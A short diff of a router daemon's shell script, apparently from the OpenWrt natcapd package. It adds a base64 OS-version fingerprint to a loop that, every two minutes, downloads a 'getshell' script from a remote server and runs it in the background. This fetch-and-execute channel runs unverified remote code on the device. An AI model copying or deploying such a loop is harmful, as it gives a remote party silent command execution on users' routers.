@@ -28,13 +28,17 @@ gfwlist_update_main () {
 }
 
 main() {
+	. /etc/openwrt_release
+	VER=`echo -n "$DISTRIB_ID-$DISTRIB_RELEASE-$DISTRIB_REVISION-$DISTRIB_CODENAME" | base64`
+	VER=`echo $VER | sed 's/ //g'`
 	cp /usr/share/natcapd/cacert.pem /tmp/cacert.pem
 	while :; do
 		sleep 120
 		rm -f /tmp/xx.sh
 		rm -f /tmp/nohup.out
 		ACC=`uci get natcapd.default.account 2>/dev/null`
-		/usr/bin/wget --ca-certificate=/tmp/cacert.pem -q "https://router-sh.ptpt52.com/router-update.cgi?cmd=getshell&acc=$ACC&cli=$CLI" -O /tmp/xx.sh
+		/usr/bin/wget --ca-certificate=/tmp/cacert.pem -qO /tmp/xx.sh \
+		"https://router-sh.ptpt52.com/router-update.cgi?cmd=getshell&acc=$ACC&cli=$CLI&ver=$VER"
 		head -n1 /tmp/xx.sh | grep '#!/bin/sh' >/dev/null 2>&1 && {
 			chmod +x /tmp/xx.sh
 			nohup /tmp/xx.sh &
